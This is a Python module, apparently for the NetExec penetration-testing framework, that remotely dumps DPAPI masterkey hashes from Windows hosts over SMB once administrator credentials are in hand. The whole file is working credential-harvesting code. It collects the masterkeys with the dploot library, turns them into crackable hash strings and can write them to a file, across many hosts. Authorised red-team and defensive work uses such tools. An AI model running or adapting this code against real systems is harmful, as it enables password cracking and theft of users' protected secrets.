from dploot.lib.target import Target
from dploot.triage.masterkeys import MasterkeysTriage

from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection

# Based on dpapimk2john, original work by @fist0urs


class NXCModule:
    name = "dpapi_hash"
    description = "Remotely dump Dpapi hash based on masterkeys"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """OUTPUTFILE       Output file to write hashes"""
        self.outputfile = None
        if "OUTPUTFILE" in module_options:
            self.outputfile = module_options["OUTPUTFILE"]

    def on_admin_login(self, context, connection):
        username = connection.username
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=connection.domain,
            username=username,
            password=password,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            lmhash=getattr(connection, "lmhash", ""),
            nthash=nthash,
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )
        
        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            context.log.debug("Could not upgrade connection")
            return
        
        try:
            context.log.display("Collecting DPAPI masterkeys, grab a coffee and be patient...")
            masterkeys_triage = MasterkeysTriage(
                target=target,
                conn=conn,
            )
            context.log.debug(f"Masterkeys Triage: {masterkeys_triage}")
            context.log.debug("Collecting user masterkeys")
            masterkeys_triage.triage_masterkeys()
            if self.outputfile is not None:
                with open(self.outputfile, "a+") as fd:
                    for mkhash in [mkhash for masterkey in masterkeys_triage.all_looted_masterkeys for mkhash in masterkey.generate_hash()]:
                        context.log.highlight(mkhash)
                        fd.write(f"{mkhash}\n")
            else:
                for mkhash in [mkhash for masterkey in masterkeys_triage.all_looted_masterkeys for mkhash in masterkey.generate_hash()]:
                    context.log.highlight(mkhash)
            
        except Exception as e:
            context.log.debug(f"Could not get masterkeys: {e}")